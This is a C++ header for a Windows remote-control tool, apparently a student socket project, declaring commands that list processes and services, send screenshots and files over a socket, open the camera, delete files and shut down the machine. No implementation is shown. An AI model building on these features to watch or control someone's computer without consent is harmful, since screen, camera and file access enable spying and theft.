#pragma once

#include <iostream>
#include <string>
#include <vector>
#include <set>
#include <sstream>
#include <fstream>
#include <iomanip>
#include <windows.h>
#include <tlhelp32.h>
#include <gdiplus.h>

// Add these pragma comments
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "user32.lib")

#ifndef DEFAULT_BUFLEN
#define DEFAULT_BUFLEN 4096
#endif

using namespace std;
using namespace Gdiplus;

class Command {
private:
    ULONG_PTR gdiplusToken;

    // Helper functions
    bool IsVisibleWindow(DWORD processID);
    int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);
    void InitializeGDIPlus(ULONG_PTR& gdiplusToken);
    void ShutdownGDIPlus(ULONG_PTR gdiplusToken);


public:
    Command();
    ~Command();

    // Application commands
    string Applist();
    vector<wstring> GetRunningApplications();

    // Service commands
    string Listservice();
    vector<wstring> GetRunningServices();

    // Process commands
    string Listprocess();
    vector<pair<wstring, DWORD>> GetAllRunningProcesses();

    // Screenshot commands
    vector<BYTE> captureScreenWithGDIPlus(int& width, int& height);
    void sendImage(SOCKET clientSocket, const vector<BYTE>& image);

    // Camera commands
    void openCamera();
    void closeCamera();

    // System commands
    void shutdownComputer();
    string help();

    void SendMessages(SOCKET clientSocket, const std::string& message);
    void sendFile(SOCKET clientSocket, const std::string& fileName);
    void handleViewFile(SOCKET clientSocket, const std::string& fileName);
    void handleDeleteFile(SOCKET clientSocket, const string& fileName);
    void handleClientCommands(SOCKET clientSocket, string command);
};
